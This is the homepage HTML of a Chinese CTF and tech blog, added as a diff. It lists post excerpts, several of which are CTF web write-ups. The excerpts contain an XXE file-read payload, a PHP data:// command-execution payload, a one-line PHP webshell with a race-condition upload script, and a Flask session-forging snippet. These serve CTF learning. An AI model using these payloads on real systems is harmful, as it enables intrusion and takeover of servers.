@@ -1,0 +1,232 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Link's Blog</title><meta name="author" content="Link"><meta name="copyright" content="Link"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="Link&#39;s Blog">
+<meta property="og:url" content="http://1lnk.top/index.html">
+<meta property="og:site_name" content="Link&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://1lnk.top/img/1.jpg">
+<meta property="article:author" content="Link">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://1lnk.top/img/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "Link's Blog",
+  "alternateName": [
+    "1lnk.top"
+  ],
+  "url": "http://1lnk.top/"
+}</script><link rel="shortcut icon" href="/img/round.png"><link rel="canonical" href="http://1lnk.top/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Link\'s Blog',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> Categories</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(/img/1280.avif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Link's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="site-info"><h1 id="site-title">Link's Blog</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/link66668" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/1123882463" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #FB7299;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="post_cover right"><a href="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/" title="完美解决hexo与vscode无法同时预览图片的路径问题"><img class="post-bg" src="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="完美解决hexo与vscode无法同时预览图片的路径问题"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/" title="完美解决hexo与vscode无法同时预览图片的路径问题">完美解决hexo与vscode无法同时预览图片的路径问题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-11T09:38:52.000Z" title="发表于 2025-12-11 17:38:52">2025-12-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/hexo/">hexo</a></span></div><div class="content">前言由于vscode 直接粘贴图片到md里面时 默认是 1![alt text](image-2.png) 但是hexo 识别图片路径在 md文件夹下导致 hexo 和 vscode 没办法 同时预览图片我看网上没有讲的很完美的方案 于是在此补充  方法修改_config.yml将hexo 的_config.yml配置文件中 post_asset_folder 项改成如下参数 1234post_asset_folder: truemarked:  prependRoot: true  postAsset: true  注意 marked部分不能少 少了 图片无法正常识别  修改vscode 配置在vscode 设置 中搜索Markdown › Copy Files: Destination添加如图配置即**&#x2F;*.md 和${documentBaseName}&#x2F;${fileName}这可以让你图片粘贴到你md文件对应的文件夹下 安装 hexo-assert-img在你blog的根目录执行  1npm install hexo-asset-img --save 效...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/" title="kali虚拟机不能拖拽文件解决方案"><img class="post-bg" src="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/cover.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kali虚拟机不能拖拽文件解决方案"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/" title="kali虚拟机不能拖拽文件解决方案">kali虚拟机不能拖拽文件解决方案</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-03T12:59:44.000Z" title="发表于 2025-12-03 20:59:44">2025-12-03</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/vmware/">vmware</a><span class="article-meta-link">•</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/kali/">kali</a></span></div><div class="content">2025版 kali（VMware17） 无法实现将windows文件直接拖入kali桌面 而是会放在&#x2F;home&#x2F;用户&#x2F;.cache&#x2F;drop and （忘记了）&#x2F;下猜测 和Ubuntu一样是桌面版本问题  可以回退到kali-2024.4版  没有这个问题kali 旧版本链接：https://old.kali.org/kali-images/ </div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/11/29/MoeCTF-2025-wp/" title="MoeCTF 2025 wp"><img class="post-bg" src="/2025/11/29/MoeCTF-2025-wp/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MoeCTF 2025 wp"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/11/29/MoeCTF-2025-wp/" title="MoeCTF 2025 wp">MoeCTF 2025 wp</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-11-28T18:11:37.000Z" title="发表于 2025-11-29 02:11:37">2025-11-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%B5%9B%E4%BA%8B/">赛事</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/web/">web</a></span></div><div class="content">Web0 Web入门指北jsfuck编码 控制台运行即可 10 第十章 天机符阵xxe注入payload: 1234&lt;!DOCTYPE data [  &lt;!ENTITY abc SYSTEM &quot;file:///var/www/html/flag.txt&quot;&gt;]&gt;&lt;解析&gt;&amp;abc;&lt;/解析&gt; 16 第十六章 昆仑星途src： 12345&lt;?phperror_reporting(0);highlight_file(__FILE__);include($_GET[&#x27;file&#x27;] . &quot;.php&quot;); payload: data伪协议 拼接后.php无影响 1/?file=data://text/plain,&lt;?php system(&#x27;whoami&#x27;) ?&gt; Moe笑传之猜猜爆js代码审计，可以得知随机数生成并且储存为一个参数randomNumber，直接在控制台里输入这个参数名字即可获得随机数字。 13 第十三章 通幽关·灵纹诡影图片木...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/11/18/SuperFileSystem/" title="SuperFileSystem"><img class="post-bg" src="/2025/11/18/SuperFileSystem/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SuperFileSystem"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/11/18/SuperFileSystem/" title="SuperFileSystem">SuperFileSystem</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-11-18T00:57:18.000Z" title="发表于 2025-11-18 08:57:18">2025-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Web/">Web</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E8%BD%AF%E9%93%BE%E6%8E%A5/">软链接</a><span class="article-meta-link">•</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/flask-session/">flask_session</a></span></div><div class="content">待解为什么环境变量的key不是test？为什么FileSystem不能通过proc&#x2F;self&#x2F;environ访问env文件？前置知识proc&#x2F;self&#x2F;environflask_session12345678910111213import flask_unsign# 要伪造的数据data = &#123;    &quot;username&quot;: &quot;admin1&quot;,    &quot;role&quot;: &quot;admin&quot;&#125;# 已知密钥secret = &quot;bbc77bd26e9f4ea1af87d1ce3c11e3c4&quot;# 生成伪造的sessionforged_session = flask_unsign.sign(data, secret=secret)print(forged_session) 复现源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/11/17/filesystem/" title="FileSystem"><img class="post-bg" src="/2025/11/17/filesystem/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="FileSystem"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/11/17/filesystem/" title="FileSystem">FileSystem</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-11-17T13:08:07.000Z" title="发表于 2025-11-17 21:08:07">2025-11-17</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Web/">Web</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E8%BD%AF%E9%93%BE%E6%8E%A5/">软链接</a><span class="article-meta-link">•</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/express%E6%A1%86%E6%9E%B6%E7%9A%84session%E4%BC%AA%E9%80%A0/">express框架的session伪造</a><span class="article-meta-link">•</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XFF%E5%A4%B4%E3%80%81%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/">XFF头、目录穿越</a></span></div><div class="content">前置知识软链接ln -s   zip -y .zip  express框架session伪造Express Session 伪造的核心原理是绕过服务器的会话验证机制，构造一个能被服务器认可的虚假会话（Session）。其本质是利用会话管理的核心逻辑漏洞（如密钥泄露、签名规则被破解等），生成符合服务器验证格式的会话标识。 一、Express Session 的正常工作流程要理解伪造原理，先明确正常会话的生命周期：  会话创建：用户登录时，服务器生成唯一的 sessionId（如 UUID），并关联用户数据（如 userId），存储在服务器的会话存储中（如内存、Redis）。 签名 Session ID：服务器用配置的 secret（签名密钥）对 sessionId 进行签名，生成 s:sessionId.签名值 格式的字符串（s: 是 Express 的签名标识）。 发送 Cookie：服务器将签名后的字符串通过 connect.sid 这个 Cookie 发送给浏览器，浏览器后续请求会自动携带该 Cookie。 验证会话：服务器接收请求时，从 connect.sid 中提取签名后...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/11/15/EZ_PY/" title="EZ_PY"><img class="post-bg" src="/2025/11/15/EZ_PY/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="EZ_PY"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/11/15/EZ_PY/" title="EZ_PY">EZ_PY</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-11-15T12:54:38.000Z" title="发表于 2025-11-15 20:54:38">2025-11-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/2025TSCTF/">2025TSCTF</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/web/">web</a></span></div><div class="content">EZ_PY前置知识原型链污染JWT验证JWT（JSON Web Token）验证的核心是通过签名确保 Token 未被篡改，同时验证 Token 的合法性（有效期、签发者等），避免身份伪造。核心验证原理JWT 由Header.Payload.Signature三段式字符串组成，验证过程围绕这三部分展开，核心是 “签名校验” 和 “内容合法性校验”。  验证前的基础处理服务器接收 Token 后，先按.分割为 Header、Payload、Signature 三部分。对 Header 和 Payload 分别进行 Base64 解码（注意：Base64 是编码而非加密，可直接解码查看内容）。 核心：签名校验（防篡改关键）签名是 JWT 验证的核心，目的是确认 Token 内容未被修改，且来自合法签发者。服务器获取本地存储的密钥（如你之前提到的 SECRET_KEY，HS256 算法用对称密钥，RS256 用私钥签名、公钥验证）。按 Header 中指定的算法（如 HS256），用 “解码后的 Header + 解码后的 Payload + 密钥” 重新计算签名。将重新计算的签名，与...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/11/14/TSCTFwp/" title="TSCTFwp"><img class="post-bg" src="/2025/11/14/TSCTFwp/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TSCTFwp"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/11/14/TSCTFwp/" title="TSCTFwp">TSCTFwp</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-11-13T17:21:48.000Z" title="发表于 2025-11-14 01:21:48">2025-11-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%B5%9B%E4%BA%8B/">赛事</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80/">基础</a></span></div><div class="content">Web 方向争渡上传php文件 web返回 已从tmp删除 可知存在时间差 1234&lt;?php$f = fopen(&quot;shell.php&quot;, &quot;w&quot;);fputs($f, &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);?&gt; 利用这个脚本 在服务器删除该文件之前 访问文件 使其在tmp写入一句话木马 12345678910111213141516171819202122232425import requestsimport timeurl = &quot;http://127.0.0.1:60865/tmp/getshell.php&quot;while True:    try:        html = requests.get(url, headers=headers, timeout=5)  # 设置超时时间，避免无限等待        if html.status_code == 200:            print(&quot;OK&quo...</div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Link</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/link66668"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/link66668" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/1123882463" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #FB7299;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">CS2 is the best game</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/" title="完美解决hexo与vscode无法同时预览图片的路径问题"><img src="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="完美解决hexo与vscode无法同时预览图片的路径问题"/></a><div class="content"><a class="title" href="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/" title="完美解决hexo与vscode无法同时预览图片的路径问题">完美解决hexo与vscode无法同时预览图片的路径问题</a><time datetime="2025-12-11T09:38:52.000Z" title="发表于 2025-12-11 17:38:52">2025-12-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/" title="kali虚拟机不能拖拽文件解决方案"><img src="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/cover.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kali虚拟机不能拖拽文件解决方案"/></a><div class="content"><a class="title" href="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/" title="kali虚拟机不能拖拽文件解决方案">kali虚拟机不能拖拽文件解决方案</a><time datetime="2025-12-03T12:59:44.000Z" title="发表于 2025-12-03 20:59:44">2025-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/29/MoeCTF-2025-wp/" title="MoeCTF 2025 wp"><img src="/2025/11/29/MoeCTF-2025-wp/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MoeCTF 2025 wp"/></a><div class="content"><a class="title" href="/2025/11/29/MoeCTF-2025-wp/" title="MoeCTF 2025 wp">MoeCTF 2025 wp</a><time datetime="2025-11-28T18:11:37.000Z" title="发表于 2025-11-29 02:11:37">2025-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/18/SuperFileSystem/" title="SuperFileSystem"><img src="/2025/11/18/SuperFileSystem/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SuperFileSystem"/></a><div class="content"><a class="title" href="/2025/11/18/SuperFileSystem/" title="SuperFileSystem">SuperFileSystem</a><time datetime="2025-11-18T00:57:18.000Z" title="发表于 2025-11-18 08:57:18">2025-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/17/filesystem/" title="FileSystem"><img src="/2025/11/17/filesystem/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="FileSystem"/></a><div class="content"><a class="title" href="/2025/11/17/filesystem/" title="FileSystem">FileSystem</a><time datetime="2025-11-17T13:08:07.000Z" title="发表于 2025-11-17 21:08:07">2025-11-17</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/2025TSCTF/"><span class="card-category-list-name">2025TSCTF</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Web/"><span class="card-category-list-name">Web</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%85%B6%E4%BB%96/"><span class="card-category-list-name">其他</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E8%B5%9B%E4%BA%8B/"><span class="card-category-list-name">赛事</span><span class="card-category-list-count">2</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/XFF%E5%A4%B4%E3%80%81%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/" style="font-size: 1.1em; color: #999">XFF头、目录穿越</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 1.1em; color: #999">基础</a> <a href="/tags/express%E6%A1%86%E6%9E%B6%E7%9A%84session%E4%BC%AA%E9%80%A0/" style="font-size: 1.1em; color: #999">express框架的session伪造</a> <a href="/tags/kali/" style="font-size: 1.1em; color: #999">kali</a> <a href="/tags/flask-session/" style="font-size: 1.1em; color: #999">flask_session</a> <a href="/tags/web/" style="font-size: 1.5em; color: #99a9bf">web</a> <a href="/tags/hexo/" style="font-size: 1.1em; color: #999">hexo</a> <a href="/tags/%E8%BD%AF%E9%93%BE%E6%8E%A5/" style="font-size: 1.5em; color: #99a9bf">软链接</a> <a href="/tags/vmware/" style="font-size: 1.1em; color: #999">vmware</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">5</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">7</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2025-12-11T10:25:55.132Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/1280.avif);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Link</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>window.typedJSFn = {
+  init: str => {
+    window.typed = new Typed('#subtitle', Object.assign({
+      strings: str,
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50,
+    }, null))
+  },
+  run: subtitleType => {
+    if (true) {
+      if (typeof Typed === 'function') {
+        subtitleType()
+      } else {
+        btf.getScript('https://cdn.jsdelivr.net/npm/typed.js@2.1.0/dist/typed.umd.min.js').then(subtitleType)
+      }
+    } else {
+      subtitleType()
+    }
+  },
+  processSubtitle: (content, extraContents = []) => {
+    if (true) {
+      const sub = ["Find yourself"].slice()
+
+      if (extraContents.length > 0) {
